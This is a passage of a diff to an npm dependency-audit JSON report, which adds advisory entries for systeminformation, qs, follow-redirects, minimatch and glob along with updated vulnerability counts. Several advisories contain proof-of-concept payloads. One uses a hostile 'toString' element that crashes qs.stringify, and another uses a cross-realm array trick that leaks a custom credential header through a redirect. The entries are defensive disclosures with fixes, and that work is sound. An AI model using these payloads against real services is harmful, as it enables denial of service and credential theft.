removes the marker afterward. I did not identify an application network route that forwards remote input to `services()`, so remote exploitability depends on the consuming application.\n\n### Impact\n\nAn application that passes attacker-controlled input to `services()` on Windows can execute PowerShell commands with the Node.js process account's permissions. Depending on that account, commands may read or change accessible files, alter application data, or disrupt the service. I searched this repository for HTTP servers, route handlers, and listener calls and found none. `services()` is exposed through the package API and `getDynamicData()`, so a consuming application could make the input network-reachable if it forwards request data. A separate loopback HTTP harness did trigger the command through a query parameter, but that server was test code and is not part of this repository. The project's `docs/security.html` already warns that arbitrary untrusted input to `services()` needs caution because package sanitization does not cover every case.",
+      "reported_by": null,
+      "title": "systeminformation vulnerable to Windows command injection in services() through Unicode quotation marks",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-116576"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "systeminformation",
+      "vulnerable_versions": "<5.33.16",
+      "github_advisory_id": "GHSA-3f7j-7jwc-fxfj",
+      "recommendation": "Upgrade to version 5.33.16 or later",
+      "patched_versions": ">=5.33.16",
+      "updated": "2026-10-28T22:42:50.000Z",
+      "cvss": {
+        "score": 7.8,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-3f7j-7jwc-fxfj"
+    },
+    "1243687": {
+      "findings": [
+        {
+          "version": "6.16.0",
+          "paths": [
+            ".>@lhci/cli>express>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-6pq8-jhm2-2vcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110816\n- https://github.com/ljharb/qs/commit/a952e7519338ef0cfb25694a2988848f93333727\n- https://github.com/ljharb/qs/releases/tag/v6.16.1\n- https://github.com/advisories/GHSA-6pq8-jhm2-2vcw",
+      "created": "2026-10-27T16:10:55.000Z",
+      "id": 1243687,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.\n\n## Root Cause\n\nWhen `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `\"string\"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.\n\n```text\nlib/stringify.js  (comma-array branch)\n  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path\n  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path\nlib/utils.js\n  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path\n```\n\n## Impact\n\nPrerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.\n\n## Proof of Concept\n\n`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`\n\n```js\nvar qs = require('qs');\n\n// Source A: qs.parse with allowPrototypes retains the hostile toString segment\nqs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });\n\n// Source B: a JSON request body, no qs parse option needed\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma' });\n\n// Also affected: the encodeValuesOnly sub-path\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });\n```\n\n```text\nA default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value\nB default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value\nC encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value\nN2 callable toString => NO THROW; output=\"a=z\"\nN3 isBuffer vector (CVE-2026-82417) => NO THROW; output=\"a%5Bconstructor%5D%5BisBuffer%5D=x\"\nqs version: 6.16.0\n```\n\n## Attack Chain\n\n1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.\n2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{\"a\":[{\"toString\":\"x\"}]}`.\n3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.\n4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.\n5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.\n6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).\n\n## Bypass Evidence\n\nThis is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S \"obj.join(','\" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{\"a\":[[{\"toString\":\"x\"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: qs`\n- `Confirmed affected range: >= 6.7.0, <= 6.16.0`\n- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`\n- `Fix status: fixed in 6.16.1 (a952e75)`\n\nThe `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `<= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.\n\n## Suggested Fix\n\nThe comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.\n\nReported by zx (GitHub: @manus-pi).\n\n---\n\n## Independent report by @Lucidsec\n\nThe following was reported separately, after this advisory, and is merged here as a duplicate.\n\n### Summary\n\nIn project [qs](https://github.com/ljharb/qs), in versions `>= 6.7.0, <= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.\n\n### Technical Details\n\n`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.\n\nA second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).\n\nWho can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{\"a\":[{\"toString\":\"x\"}]}`.\n\nCause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.\n\n### Impact\n\nOne small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.\n\n### Proof of Concept\n\n<details>\n<summary>Show the proof of concept</summary>\n\nChecked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.\n\n- Payload `{\"a\":[{\"toString\":\"x\"}]}` throws at `lib/stringify.js:156`.\n- Baseline `{\"a\":[\"x\",\"y\"]}` returns 200 with body `a=x%2Cy`.\n- A plain object element stringifies to `a=%5Bobject%20Object%5D` and does not throw.\n- `encodeValuesOnly: true` throws via `utils.js:292`.\n- `plainObjects` parse plus comma throws.\n\n</details>\n\n### Suggested Fix\n\nBefore `join`, map elements with the existing primitive check; skip or replace non-primitives so `join` cannot throw. On the `encodeValuesOnly` path, do not send non-primitives into `String()`. Optionally guard `lib/utils.js:292`. Add new regression tests.",
+      "reported_by": null,
+      "title": "qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110816"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.7.0 <=6.16.0",
+      "github_advisory_id": "GHSA-6pq8-jhm2-2vcw",
+      "recommendation": "Upgrade to version 6.16.1 or later",
+      "patched_versions": ">=6.16.1",
+      "updated": "2026-10-29T02:22:33.000Z",
       "cvss": {
         "score": 5.3,
         "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
       },
       "cwe": [
-        "CWE-1284"
+        "CWE-248",
+        "CWE-704"
       ],
-      "url": "https://github.com/advisories/GHSA-hp3w-g68c-fv3c"
+      "url": "https://github.com/advisories/GHSA-6pq8-jhm2-2vcw"
+    },
+    "1244003": {
+      "findings": [
+        {
+          "version": "1.16.1",
+          "paths": [
+            "apps__web>@scalar/api-reference-react>@scalar/api-reference>@scalar/api-client>@vueuse/integrations>axios>follow-redirects"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-mrwp-f3q8-3g9p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-116689\n- https://github.com/follow-redirects/follow-redirects/commit/b0a7751e9cd64cd8eeb6ec67d2f206a9cc88d3f8\n- https://github.com/follow-redirects/follow-redirects/releases/tag/v1.16.2\n- https://github.com/advisories/GHSA-mrwp-f3q8-3g9p",
+      "created": "2026-10-30T22:59:33.000Z",
+      "id": 1244003,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nfollow-redirects 1.16.0 and 1.16.1 validate the documented sensitiveHeaders option with instanceof Array. An array created in another JavaScript realm is silently replaced with an empty list, so a caller-declared custom credential header can be forwarded to an attacker-controlled cross-origin redirect destination.\n\n### Details\n\nAffected versions\n\nThe sensitiveHeaders option was introduced in 1.16.0. Published 1.16.0 and 1.16.1 both reproduced, giving a tested affected range of 1.16.0 through 1.16.1. The source checkout was pinned at revision 46301256333c90b7faac7aa126effe72ec16d16e; the exact npm 1.16.1 artifact reproduced independently.\n\nRoot cause\n\nindex.js resets options.sensitiveHeaders when its local isArray() helper returns false. That helper uses value instanceof Array, which depends on realm identity. The same file already uses Array.isArray(options.headers), which correctly recognizes arrays across realms.\n\nSuggested remediation\n\nUse Array.isArray(value) for sensitiveHeaders, then validate and normalize each member as a header-name string. Add same-realm and node:vm cross-realm tests for cross-origin redirects, including the array-form headers representation. Verify that custom sensitive names are removed while unrelated headers remain unchanged.\n\nDuplicate review\n\nThe public advisory history contains other sensitive-header findings, including array-form headers and regular-expression handling, but focused repository searches found no report describing cross-realm validation as of 2026-10-25. A private or differently worded report may already exist.\n\n### Proof of concept\n\nStart two loopback HTTP servers. The first returns a 302 redirect to the second. Send X-API-Key and list that name in sensitiveHeaders, then compare a normal array with a genuine cross-realm array created by:\n\n```js\nconst vm = require('node:vm');\nconst sensitiveHeaders = vm.runInNewContext(`['X-API-Key']`);\n```\n\nObserved against both source and the exact npm 1.16.1 package:\n\n- Same-realm ['X-API-Key']: the redirect target did not receive the key.\n- Cross-realm ['X-API-Key']: Array.isArray(value) was true, value instanceof Array was false, and the redirect target received X-API-Key.\n- An unrelated X-Harmless header remained present in both cases.\n\nThe complete 3.5 KB loopback-only harness and raw JSON output are available privately.\n\n### Impact\n\ncustom credential disclosure. Exploitation requires a direct caller or wrapper that preserves a cross-realm sensitiveHeaders array, a custom credential listed in that option, and an attacker-controlled or compromised endpoint that returns a cross-origin redirect. The directly demonstrated result is disclosure of the custom header value, potentially exposing an API key or service token until revocation.\n\nBuilt-in Authorization, Proxy-Authorization, and Cookie protections remained effective. Exact Axios 1.20.0 with follow-redirects 1.16.1 did not reproduce because Axios normalized the array; this report does not claim that Axios is affected. No third-party service was tested.",
+      "reported_by": null,
+      "title": "follow-redirects: Cross-realm sensitiveHeaders arrays are discarded and custom credentials can follow redirects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-116689"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "follow-redirects",
+      "vulnerable_versions": ">=1.16.0 <=1.16.1",
+      "github_advisory_id": "GHSA-mrwp-f3q8-3g9p",
+      "recommendation": "Upgrade to version 1.16.2 or later",
+      "patched_versions": ">=1.16.2",
+      "updated": "2026-10-30T22:59:34.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-201"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrwp-f3q8-3g9p"
+    },
+    "1244012": {
+      "findings": [
+        {
+          "version": "3.1.5",
+          "paths": [
+            ".>@lhci/cli>chrome-launcher>rimraf>glob>minimatch"
+          ]
+        },
+        {
+          "version": "9.0.9",
+          "paths": [
+            ".>@testcontainers/postgresql>testcontainers>archiver>archiver-utils>glob>minimatch"
+          ]
+        },
+        {
+          "version": "5.1.9",
+          "paths": [
+            ".>@testcontainers/postgresql>testcontainers>archiver>readdir-glob>minimatch"
+          ]
+        },
+        {
+          "version": "10.2.5",
+          "paths": [
+            ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch"
+          ]
+        },
+        {
+          "version": "3.1.4",
+          "paths": [
+            ".>eslint-plugin-import>minimatch"
+          ]
+        },
+        {
+          "version": "10.2.3",
+          "paths": [
+            ".>eslint-plugin-sonarjs>minimatch"
+          ]
+        },
+        {
+          "version": "10.2.4",
+          "paths": [
+            ".>glob>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118764\n- https://github.com/isaacs/minimatch/commit/77a0f5c4b80bdc641c3c930a1d9edf5ad2db57f8\n- https://github.com/isaacs/minimatch/releases/tag/v11.0.1\n- https://github.com/advisories/GHSA-g3hv-75wg-m249",
+      "created": "2026-10-30T23:09:55.000Z",
+      "id": 1244012,
+      "npm_advisory_id": null,
+      "overview": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.\n\nresearcher: Reid Downing (b1nv0id)\nfiles: \n\n- src/index.ts: 690-770\n- src/index.ts: 780-796\n\nissue:\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\n\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\n```\nparts.splice(gs, 1)\nconst other = parts.slice(0)\nother[gs] = '**'\nglobParts.push(other)\n```\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\n\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\n```\nfor (let i = 0; i < globParts.length - 1; i++) {\n  for (let j = i + 1; j < globParts.length; j++) {\n    this.partsMatch(...)\n  }\n}\n```\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.",
+      "reported_by": null,
+      "title": "minimatch has potential denial of service via globparts amplification",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118764"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<11.0.1",
+      "github_advisory_id": "GHSA-g3hv-75wg-m249",
+      "recommendation": "Upgrade to version 11.0.1 or later",
+      "patched_versions": ">=11.0.1",
+      "updated": "2026-10-30T23:09:56.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-g3hv-75wg-m249"
+    },
+    "1244013": {
+      "findings": [
+        {
+          "version": "10.5.0",
+          "paths": [
+            ".>@testcontainers/postgresql>testcontainers>archiver>archiver-utils>glob"
+          ]
+        },
+        {
+          "version": "13.0.6",
+          "paths": [
+            ".>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-3g3m-2fjr-6pw4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118773\n- https://github.com/isaacs/node-glob/commit/4682e8c9babee1b385202ede36389634e12076d7\n- https://github.com/isaacs/node-glob/releases/tag/v14.0.2\n- https://github.com/advisories/GHSA-3g3m-2fjr-6pw4",
+      "created": "2026-10-30T23:09:11.000Z",
+      "id": 1244013,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nIn glob 13.0.6, an aborted async walk rejects or emits an error but continues recursively reading directories in the background.\n\nThe root cause is that abort branches in src/walker.ts call cb() without returning. As a result, callers that rely on signal or AbortSignal.timeout() to bound glob traversal cost can still incur filesystem I/O and CPU work after the request has already been rejected.\n\n### Details\n\nThis was reproduced on glob v13.0.6 (commit e80cb38ae60d6cbff9e75f39032a994858994d35).\n\nThe README documents that the signal option cancels the glob walk. However, in src/walker.ts, the following methods call cb() when this.signal?.aborted is true but do not return:\n\n- GlobUtil.walkCB()\n- GlobUtil.walkCB2()\n- GlobUtil.walkCBSync()\n- GlobUtil.walkCB2Sync()\n\nExample vulnerable pattern:\n\nif (this.signal?.aborted) cb()\n\nBecause execution continues after cb(), the walker still reaches processor.processPatterns(), readdirCB(), and recursive walkCB2() calls.\n\nThe issue was directly demonstrated against v13.0.6. A source-history review shows the same missing-return pattern is present in tagged releases from v9.0.0 through v13.0.6.\n\nThe issue affects both glob() and globStream().\n\nRecommended fix:\nChange each abort branch to return immediately:\n\nif (this.signal?.aborted) return cb()\n\n### Proof of concept\n\nEnvironment:\n- Linux x86_64\n- Node.js v22.23.3\n- npm 10.9.9\n- glob 13.0.6\n\nReproduction steps:\n\n1. Install the affected package:\n   npm init -y\n   npm install glob@13.0.6\n\n2. Run the attached PoC:\n   node poc/abort-continues-work.mjs\n\nThe PoC aborts after the first readdir() call, waits briefly, and counts how many more directory reads happen after the promise has already rejected.\n\nObserved output on the vulnerable version:\n\n{\n  \"rejection\": \"Error: probe-abort\",\n  \"readdirCalls\": 1365,\n  \"readdirCallsAtReject\": 5,\n  \"readdirCallsAfterReject\": 1360\n}\n\nExpected behavior:\nreaddirCallsAfterReject should be 0.\n\nA second PoC using AbortSignal.timeout() also reproduces the issue:\n\n{\n  \"rejection\": \"TimeoutError: The operation was aborted due to timeout\",\n  \"readdirCalls\": 133,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 132\n}\n\nThe same test against a patched build with return cb() in the four abort branches stops immediately:\n\n{\n  \"readdirCalls\": 1,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 0\n}\n\n### Impact\n\nThis is an availability issue.\n\nApplications that expose globbing over attacker-influenced patterns or attacker-controlled directory trees and use AbortSignal / AbortSignal.timeout() as a traversal budget can still perform significant filesystem I/O and CPU work after a request has already timed out or been canceled.\n\nRepeated timed-out requests can stack background glob walks and degrade worker throughput or service availability.\n\nNo confidentiality or integrity impact was observed.",
+      "reported_by": null,
+      "title": "Glob: AbortSignal cancellation bypass allows post-timeout filesystem traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118773"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "glob",
+      "vulnerable_versions": ">=9.0.0 <=14.0.1",
+      "github_advisory_id": "GHSA-3g3m-2fjr-6pw4",
+      "recommendation": "Upgrade to version 14.0.2 or later",
+      "patched_versions": ">=14.0.2",
+      "updated": "2026-10-30T23:09:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-3g3m-2fjr-6pw4"
     }
   },
   "muted": [],
   "metadata": {
     "vulnerabilities": {
       "info": 0,
-      "low": 0,
-      "moderate": 1,
-      "high": 3,
+      "low": 1,
+      "moderate": 15,
+      "high": 4,
       "critical": 0
     },
-    "dependencies": 2582,
+    "dependencies": 2620,
     "devDependencies": 0,
     "optionalDependencies": 0,
-    "totalDependencies": 2582
+    "totalDependencies": 2620
   }
 }
